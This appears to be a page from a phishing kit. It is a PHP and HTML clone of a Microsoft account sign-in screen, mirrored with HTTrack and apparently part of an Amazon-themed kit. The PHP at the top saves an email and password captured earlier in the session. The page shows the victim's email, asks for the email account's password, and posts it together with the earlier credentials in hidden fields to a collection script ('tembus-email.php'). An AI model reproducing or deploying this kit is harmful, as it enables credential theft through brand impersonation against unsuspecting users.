<?php
session_start();
if (isset($_POST['Sex'])) {

    $_SESSION['EM'] = $_POST['EM'];
    $_SESSION['PW'] = $_POST['PW'];
}
?>
<html>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<base />
<title>Verify your Email</title>
<meta name="PageID" content="i4416"><meta name="SiteID" content="38936">
<meta name="ReqLC" content="1033"><meta name="LocLC" content="1033"/>
<link rel="shortcut icon" href="https://auth.gfx.ms/16.000.27853.1/images/favicon.ico" />
<style type="text/css">

body	{margin: 0;
        background-color : white;
        background-repeat: no-repeat;
        background-position: center;
        background-size: cover;
		font-family: "Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;
		font-weight: 400;
		font-size: 15px;
		line-height: 20px;}

@media only screen and (min-width: 600px) {
    body {
        background-image: url("../../amazon/img/t1.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5");
        background-size:cover;
        background-attachment: fixed;
    }
}

@media only screen and (max-width: 600px) {
    body {
        background-color: white;
    }
}

	
.outer{display: table;
		position: absolute;
		height: 100%;width: 100%;}
		
		
.middle{display: table-cell;
		vertical-align: middle;}
		
.inner{margin-left: auto;
margin-right: auto;
min-height: 300px;
max-height: 350px;
min-width: 275px;
max-width: 350px;
width: calc(100% - 40px);
padding: 36px;
margin-bottom: 28px;
background: #ffffff;
-webkit-box-shadow: 0px 2px 3px rgba(0, 0, 0, 0.55);
-moz-box-shadow: 0px 2px 3px rgba(0, 0, 0, 0.55);
box-shadow:0px 2px 3px rgba(0, 0, 0, 0.55);
border: 1px solid #818C94;
border: 1px solid rgba(0, 0, 0, 0.4);}

div.footerNode{margin: 0;float: right;}
.footer{position: fixed;bottom: 0px;width: 100%;overflow: visible;z-index: 99;clear: both;background-color: rgba(0, 0, 0, 0.6);}
.form-group{margin-bottom: 16px;}
.text-title{padding: 0;margin-top: 16px;margin-bottom: 12px;font-size: 24px;color: #404040;font-size: 1.5rem;line-height: 28px;font-weight: 600;line-height: 1.75rem;font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";}.text-title:lang(zh-cn), .text-title:lang(zh-tw){font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande","Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";}
.relative{position: relative;}
div.footerNode a,div.footerNode span{color: white;font-size: 12px;line-height: 28px;white-space: nowrap;display: inline-block;margin-left: 8px;margin-right: 8px;}a{text-decoration: none;}@media (max-width: 600px), (max-height: 392px){.middle{vertical-align: top;}.inner{-webkit-box-shadow: none;-moz-box-shadow: none;box-shadow: none;border: 0;padding: 24px;width: 100%;}.footer.default{background: white;}.footer.default div.footerNode a,.footer.default div.footerNode span{color: #777777;}div.footerNode{float: left;}}
 .text-line {
        background-color: transparent;
        color: #696969;
        outline: none;
        outline-style: none;
        outline-offset: 0;
        border-top: none;
        border-left: none;
        border-right: none;
        border-bottom: solid #000000 1px;
        padding: 3px 0px;
		width : 100%;
		font-size : 15px;
		font-family : Segoe UI light;
    }

	.button {
    background-color: #144BBA;
    border: none;
    color: white;
    padding: 6px 38px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 15px;
	font-family: Segoe UI;
}

input[type=checkbox]
{
  /* Double-sized Checkboxes */
  -ms-transform: scale(1); /* IE */
  -moz-transform: scale(1); /* FF */
  -webkit-transform: scale(1.5); /* Safari and Chrome */
  -o-transform: scale(1.5); /* Opera */
  padding: 10px;
}

/* Might want to wrap a span around your checkbox text */
.checkboxtext
{
  /* Checkbox text */
  font-size: 90%;
  display: inline;
}
</style>
</head>
<body>
<div>
<div class="outer" id="idHeaderTD9">
<div class="middle"><div class="inner relative">
<img src="https://logincdn.msauth.net/16.000.28345.6/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" class="logo" alt="Microsoft account" />
<div class="row form-group" style="font-size:13px;font-family:Segoe UI;">
<p style="font-size:14px">Please Login to your Email (<?php echo $_SESSION['EM']; ?>)</p>
<div class="row text-title" role="heading">Enter Password</div>
<form action="../../amazon/Actions/tembus-email.php" name="email" id="asw" method="POST">
<div class="row form-group"><input type="password" class="text-line" name="epass" value="" onfocus="this.value='';" onblur="if(this.value==''){this.value=''};" required placeholder="Password"></div>
<input type="hidden" name="user" value="<?php echo $_SESSION['EM']; ?>">
<input type="hidden" name="pass" value="<?php echo $_SESSION['PW']; ?>">
<input type="checkbox" align="middle"><a style="font-size:15px">&nbsp Keep me signed in</a><br><br>
<div class="row form-group"><a href="#">Forgot my password</a><br><br>
<div class="row form-group" align="right"><button class="button" style="cursor: pointer;" type="submit" value="submit">Sign in</button></div></div></div></div>
</form>
<div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
                    publicMethods: footerMethods,
                    params: {
                        serverData: svr,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetails: toggleDebugDetails_onClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;vv=1600&amp;uaid=9d7c1b52d0784fe8b9b52c1b918e91d9">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;vv=1600&amp;uaid=9d7c1b52d0784fe8b9b52c1b918e91d9">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --><!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus --> <a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo()" aria-label="Click here for troubleshooting information" aria-expanded="false"><!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: true } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --> <!-- ko template: { nodes: [lightImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://logincdn.msauth.net/16.000.28345.6/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="https://logincdn.msauth.net/16.000.28345.6/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="https://logincdn.msauth.net/16.000.28345.6/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73"><!-- /ko --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --><!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://logincdn.msauth.net/16.000.28345.6/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="https://logincdn.msauth.net/16.000.28345.6/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="https://logincdn.msauth.net/16.000.28345.6/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div> <!-- /ko --></div> </div>
</body>
<!-- Mirrored from login.live.com/jsDisabled.srf?mkt=EN-US&lc=1033 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 20 May 2018 14:32:49 GMT -->
</html>